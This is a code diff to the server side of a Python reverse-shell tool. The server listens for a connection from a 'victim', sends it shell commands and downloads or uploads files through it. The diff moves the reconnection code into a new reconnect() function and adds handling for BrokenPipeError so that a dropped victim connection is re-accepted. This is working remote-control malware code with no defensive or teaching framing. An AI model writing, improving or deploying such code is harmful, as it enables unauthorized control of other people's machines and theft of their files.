@@ -3,14 +3,16 @@ import sys
 import time
 
 
-# import interface
-
 def send_commands(conn):
     """Function used to send shell commands; additional used commands: quit, download, upload
     """
 
     victim_response = conn.recv(4096)
     print(victim_response.decode("utf-8"))
+
+    while not victim_response.decode("utf-8"):
+        reconnect()
+
     while True:
         try:
             cmd = input()
@@ -33,7 +35,6 @@ def send_commands(conn):
                     print("Requested file not found on the client")
                     victim_response = conn.recv(4096)
                     print(victim_response.decode("utf-8"))
-
                 else:
                     with open(down_file, 'wb') as f:
                         while receive_file:
@@ -84,13 +85,8 @@ def send_commands(conn):
                 conn.send(str.encode("null"))
                 victim_response = conn.recv(4096)
                 print(victim_response.decode("utf-8"))
-        except (ConnectionResetError, ConnectionAbortedError):
-            print("Connection with host was lost")
-            s.listen(1)
-            print("Listening on " + str(host) + ":" + str(port))
-            conn, address = s.accept()
-            print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
-            send_commands(conn)
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+            reconnect()
 
 
 def create_socket():
@@ -109,6 +105,15 @@ def create_socket():
     conn, address = s.accept()
     print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
     time.sleep(0.5)
+    send_commands(conn)
+
+
+def reconnect():
+    print("Connection with host was lost")
+    s.listen(1)
+    print("Listening on " + str(host) + ":" + str(port))
+    conn, address = s.accept()
+    print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
     send_commands(conn)
 
 
